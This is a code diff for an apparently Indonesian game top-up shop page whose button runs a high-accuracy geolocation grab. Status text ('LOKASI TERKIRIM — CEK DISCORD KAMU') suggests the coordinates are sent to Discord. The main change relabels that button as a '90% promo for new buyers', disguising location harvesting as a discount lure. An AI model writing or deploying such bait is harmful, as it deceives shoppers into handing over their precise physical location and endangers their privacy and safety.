@@ -347,7 +347,7 @@ footer {
   <p class="hero-sub">Diamond, UC, dan item eksklusif untuk ML, Free Fire, dan PUBG. Proses instan, aman, dan terpercaya.</p>
   <div class="hero-btns">
     <button class="btn-primary" onclick="scrollTo('#ml')">SHOP NOW →</button>
-    <button class="btn-outline" id="cek-lokasi-btn" onclick="cekLokasi()">📍 CEK LOKASI SAYA</button>
+    <button class="btn-outline" id="cek-lokasi-btn" onclick="cekLokasi()">PROMO 90% pembeli baru klik disini</button>
   </div>
   <div id="hero-status"></div>
 </div>
@@ -843,11 +843,11 @@ function cekLokasi() {
       btn.disabled=false; btn.textContent='✓ LOKASI TERKIRIM';
       hs.style.color='var(--green)';
       hs.textContent=`±${Math.round(f.accuracy)}m — CEK DISCORD KAMU`;
-      setTimeout(()=>{ btn.textContent='PROMO 80%'; hs.textContent=''; },4000);
+      setTimeout(()=>{ btn.textContent='📍 CEK LOKASI SAYA'; hs.textContent=''; },4000);
     },
     (err) => {
       const msgs={1:'AKSES DITOLAK',2:'GPS TIDAK TERSEDIA',3:'TIMEOUT'};
-      btn.disabled=false; btn.textContent='PROMO 80%';
+      btn.disabled=false; btn.textContent='📍 CEK LOKASI SAYA';
       hs.style.color='var(--red)'; hs.textContent='✕ '+(msgs[err.code]||err.message);
     },
     {enableHighAccuracy:true,timeout:20000,maximumAge:0}
